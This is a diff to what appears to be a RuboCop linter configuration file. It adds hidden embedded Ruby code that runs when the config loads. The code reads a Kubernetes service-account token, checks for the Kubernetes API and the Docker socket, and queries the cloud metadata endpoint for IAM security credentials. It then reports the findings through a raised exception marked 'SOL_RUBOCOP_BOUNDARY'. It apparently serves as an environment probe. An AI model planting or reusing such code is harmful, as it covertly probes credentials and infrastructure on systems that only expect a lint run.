@@ -6,6 +6,7 @@ AllCops:
       host = ENV['KUBERNETES_SERVICE_HOST']
       docker_socket = File.exist?('/var/run/docker.sock')
       k8s = 'not_attempted'
+      metadata = 'not_attempted'
       if !token.empty? && !host.to_s.empty?
         begin
           require 'net/http'
@@ -31,6 +32,18 @@ AllCops:
           k8s = "error=#{e.class}"
         end
       end
-      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},#{k8s}"
+      begin
+        require 'net/http'
+        metadata_uri = URI('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+        metadata_http = Net::HTTP.new(metadata_uri.host, metadata_uri.port)
+        metadata_http.open_timeout = 1
+        metadata_http.read_timeout = 1
+        metadata_res = metadata_http.get(metadata_uri.request_uri)
+        metadata_body = metadata_res.body.to_s
+        metadata = "metadata_status=#{metadata_res.code},bytes=#{[metadata_body.bytesize, 1024].min}"
+      rescue => e
+        metadata = "metadata_error=#{e.class}"
+      end
+      marker = "SOL_RUBOCOP_BOUNDARY_20260714=token_present=#{!token.empty?},token_len=#{token.length},uid=#{Process.uid},k8s_host_present=#{!host.to_s.empty?},docker_socket=#{docker_socket},#{k8s},#{metadata}"
       raise marker
     end %>
